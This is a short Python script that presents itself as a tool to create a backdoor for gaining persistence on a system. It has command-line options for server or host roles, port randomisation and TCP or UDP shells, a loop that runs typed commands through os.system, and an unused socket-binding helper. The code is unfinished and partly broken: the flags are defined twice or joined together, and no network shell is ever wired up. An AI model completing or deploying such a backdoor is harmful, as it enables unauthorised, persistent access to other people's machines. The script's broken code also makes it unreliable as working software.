import argparse
import os
import getpass
import socket


def parse_args():
    parser = argparse.ArgumentParser(
        description="creates a backdoor to install on a system to gain persistence")
    client_server = parser.add_mutually_exclusive_group()
    client_server.add_argument(
        '-s', '--server', help='establishes current connection as where hosts will connect to')
    client_server.add_argument(
        '-h' '--host', help='establishes current connextion as host issuing commends to the server')
    port = parser.add_mutually_exclusive_group()
    port.add_argument(
        '-p', '--port', help='defines static connection port', type=int, nargs=1)
    port_randomization = port.add_argument_group()
    port_randomization.add_argument(
        '-r', '--range', help='defines range of ports to randomize connection over', nargs=2)
    port_randomization.add_argument(
        '-s', '--seed', help='defines seed for port randomization to use')
    connection = parser.add_mutually_exclusive_group()
    connection.add_argument(
        "-u", "--udp", help="utilizes udp for shell interation")
    connection.add_argument(
        "-t", '--tcp', help="estbalishes tcp connection for shell interation")
    parser.parse_args()


def run_shell():
    os.chdir(os.getcwd())
    while True:
        command = input(getpass.getuser() + '@' + os.uname()
                        [1].split('.')[0] + ' ' + os.getcwd().split('/')[-1] + "> ")
        if 'quit' == command or command == 'exit':
            break
        try:
            os.system(command)
            if command[:3] == 'cd ':
                try:
                    os.chdir(command[3:])
                except:
                    pass
        except:
            print("failure executing command")


def host_connections(ip, port, tcp):
    print('[+] creating socket')
    try:
        host = socket.socket(
            socket.AF_INET, socket.SOCK_STREAM if tcp else socket.SOCK_DGRAM)
    except:
        print('[+] socket failed to be created')
        return False
    print('[+] socket successfully created')
    print(f'[+] binding socket to {ip}:{port}')
    try:
        host.bind((ip, port))
    except:
        print(f'[+] socket failed to bind to {ip}:{port}')
        return False
    print(f'[+] socket successfully bound to {ip}:{port}')
    return(host)


def main():
    parse_args()
    run_shell()


if __name__ == "__main__":
    main()
